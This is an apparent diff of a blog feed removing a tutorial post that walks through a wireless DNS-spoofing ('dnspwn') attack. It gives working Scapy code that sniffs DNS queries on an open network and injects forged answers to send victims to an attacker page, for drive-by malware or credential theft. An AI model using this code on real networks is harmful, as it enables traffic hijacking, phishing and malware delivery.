-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Wireless Attacks with Python: Part One - The "Dnspwn Attack"]]></title>
-    <link href="http://jordan-wright.github.io/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack/"/>
-    <updated>2013-11-15T20:45:00-06:00</updated>
-    <id>http://jordan-wright.github.io/blog/2013/11/15/wireless-attacks-with-python-part-one-the-airpwn-attack</id>
-    <content type="html"><![CDATA[<p><img src="http://jordan-wright.github.io/images/headers/wireless_python.png"/></p>
-
-<h3>Introduction</h3>
-
-<p>A while back, I <a href="http://raidersec.blogspot.com/2013/01/wireless-deauth-attack-using-aireplay.html">published a post</a> on the Raidersec blog demonstrating how to perform a deauthentication attack using Python and Scapy. I enjoyed writing the post, since I got the opportunity to learn in-depth about how different wireless attacks work, beyond just learning how to exclusively use the <a href="http://www.aircrack-ng.org/">aircrack suite</a>.</p>
-
-<p>So, with that being said, this post will kick off a short series of posts discussing how to perform common wireless attacks using Python. I hope you enjoy the posts and, as always, never hesitate to let me know if you have any comments or questions below.</p>
-
-<!--more-->
-
-
-<h3>The &ldquo;Dnspwn Attack&rdquo;</h3>
-
-<p>The first attack we&rsquo;ll explore is what I call the &ldquo;dnspwn attack&rdquo; (since, from what I can tell, this attack was first created targeting HTTP with the &ldquo;<a href="http://airpwn.sourceforge.net/Airpwn.html">airpwn</a>&rdquo; tool, and later extended to DNS) The idea behind the attack is pretty simple:</p>
-
-<p>Consider two people on the same open WLAN: Bob and Eve. Eve wants to get Bob to visit a malicious webpage she created so that she can install malware onto Bob&rsquo;s computer via a drive-by download, or perhaps show a spoofed website to try and steal Bob&rsquo;s credentials.</p>
-
-<p>To do this, she remembers that she can sniff all requests coming to and from Bob&rsquo;s computer. She also knows that she is <em>closer</em> to Bob than the web server he is sending a request to. So, she decides to wait until Bob sends a web request, and see if she can send back a spoofed response pretending to come from the web server <em>before</em> the actual web server can respond. Turns out, she can. In fact, once the spoofed response is received, Bob&rsquo;s computer will likely ignore any further traffic received, including the real response!</p>
-
-<p>Let&rsquo;s see what this would look like:</p>
-
-<p><a href="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/diagram.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/diagram_small.png"/></a></p>
-
-<p>So, now that we know how the attack works, let&rsquo;s automate it!</p>
-
-<h3>Setting up the Alfa AWUS06H</h3>
-
-<p>As was the case in my Raidersec post, we will be using the handy <a href="http://www.amazon.com/Alfa-AWUS036H-802-11b-Wireless-network/dp/B002WCEWU8">Alfa AWUS036H</a> for this attack. The first thing we want to do is to put our wireless card in monitor mode so that we can capture all traffic coming from the <code>demo_insecure</code> network.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>root@bt:~# airmon-ng start wlan0</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Now that we have monitor mode up and running on <code>mon0</code>, let&rsquo;s start coding!</p>
-
-<h3>Coding the Attack</h3>
-
-<p>We will utilize the <code>scapy</code> module to perform the attack. Let&rsquo;s start by sniffing any UDP packet with a destination of port 53, and send the packet to a function called <code>send_response</code> that we will make later:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>from scapy.all import *
-</span><span class='line'>
-</span><span class='line'>sniff(prn=lambda x: send_response(x),
-</span><span class='line'>  lfilter=lambda x:x.haslayer(UDP) and x.dport == 53)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Now let&rsquo;s create a function which can parse the request for relevant information, and inject the response. We can parse the packet and create our response simply by working our way up the layers as follows:</p>
-
-<ul>
-<li>802.11 Frame &ndash; Change the &ldquo;to-ds&rdquo; flag to &ldquo;from-ds&rdquo; (our request will now be coming <em>from</em> the access point)</li>
-<li>802.11 Frame &ndash; Switch the source and destination MAC addresses</li>
-<li>IP Layer &ndash; Switch the source and destination IP addresses</li>
-<li>UDP layer &ndash; Switch the source and destination ports</li>
-<li>DNS layer &ndash; Set the &ldquo;answer&rdquo; flag(s), and append our spoofed answer</li>
-</ul>
-
-
-<p>Fortunately, <code>scapy</code> makes this very simple for us by abstracting away a lot of minor details (e.g. in fact, there are <em>4</em> MAC address fields in an 802.11 frame, each in a different order depending on the direction of the packet). With that being said, here&rsquo;s the code:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-<span class='line-number'>8</span>
-<span class='line-number'>9</span>
-<span class='line-number'>10</span>
-<span class='line-number'>11</span>
-<span class='line-number'>12</span>
-<span class='line-number'>13</span>
-<span class='line-number'>14</span>
-<span class='line-number'>15</span>
-<span class='line-number'>16</span>
-<span class='line-number'>17</span>
-<span class='line-number'>18</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>def send_response(x):
-</span><span class='line'>  # Get the requested domain
-</span><span class='line'>  req_domain = x[DNS].qd.qname
-</span><span class='line'>  spoofed_ip = '192.168.2.1'
-</span><span class='line'>  # Let's build our response from a copy of the original packet
-</span><span class='line'>  response = x.copy()
-</span><span class='line'>  # We need to start by changing our response to be "from-ds", or from the access point.
-</span><span class='line'>  response.FCfield = 2L
-</span><span class='line'>  # Switch the MAC addresses
-</span><span class='line'>  response.addr1, response.addr2 = x.addr2, x.addr1
-</span><span class='line'>  # Switch the IP addresses
-</span><span class='line'>  response.src, response.dst = x.dst, x.src
-</span><span class='line'>  # Switch the ports
-</span><span class='line'>  response.sport, response.dport = x.dport, x.sport
-</span><span class='line'>  # Set the DNS flags
-</span><span class='line'>  response[DNS].qr = 1L
-</span><span class='line'>  response[DNS].ra = 1L
-</span><span class='line'>  response[DNS].ancount = 1</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Now that we&rsquo;ve set all the flags, let&rsquo;s create and append the DNS answer:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-<span class='line-number'>7</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>response[DNS].an = DNSRR(
-</span><span class='line'>  rrname = req_domain,
-</span><span class='line'>  type = 'A',
-</span><span class='line'>  rclass = 'IN',
-</span><span class='line'>  ttl = 900,
-</span><span class='line'>  rdata = spoofed_ip
-</span><span class='line'>  )</span></code></pre></td></tr></table></div></figure>
-
-
-<p>And, finally, we inject the spoofed response:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>sendp(response)</span></code></pre></td></tr></table></div></figure>
-
-
-<p>That&rsquo;s all there is to it! You can find the full source on <a href="https://github.com/jordan-wright/python-wireless-attacks/blob/master/dnspwn.py">Github</a>.</p>
-
-<h3>Demo</h3>
-
-<p>For the demo, I have the following HTML response available on the host 192.168.2.138:</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-<span class='line-number'>3</span>
-<span class='line-number'>4</span>
-<span class='line-number'>5</span>
-<span class='line-number'>6</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>&lt;html&gt;
-</span><span class='line'>&lt;head&gt;&lt;/head&gt;
-</span><span class='line'>&lt;body&gt;
-</span><span class='line'>  Owned.
-</span><span class='line'>&lt;/body&gt;
-</span><span class='line'>&lt;/html&gt;</span></code></pre></td></tr></table></div></figure>
-
-
-<p>It&rsquo;s worth noticing that we can have <em>any</em> HTML, Javascript, etc. we want. It would be trivial to hook the browser using the <a href="http://beefproject.com/">BeEF framework</a>, for example.</p>
-
-<p>Here&rsquo;s a screenshot of it in action (I am using my iPhone as the victim):</p>
-
-<p><a href="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/screen_shot_pc.png"/></a>
-<a href="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/iphone.png" target="_blank"><img src="http://jordan-wright.github.io/images/blog/wireless-attacks/dnspwn/iphone_small.png"/></a></p>
-
-<h3>Conclusion &amp; Future Improvements</h3>
-
-<p>It&rsquo;s important to note that this attack will work just as well on other simple request/response protocols. For example, the original &ldquo;airpwn&rdquo; attack spoofed HTTP responses. There are also quite a few improvements we can make to this script. Here are a few:</p>
-
-<ul>
-<li>Match requests against regular expressions (for example, only replacing Javascript content)</li>
-<li>Set options from arguments / Read configuration information from a file</li>
-<li>Implement the attack for other protocols (ie HTTP).</li>
-</ul>
-
-
-<p>Enjoy!</p>
-
-<p>Jordan (<a href="http://twitter.com/jw_sec">@jw_sec</a>)</p>
 ]]></content>
   </entry>
   
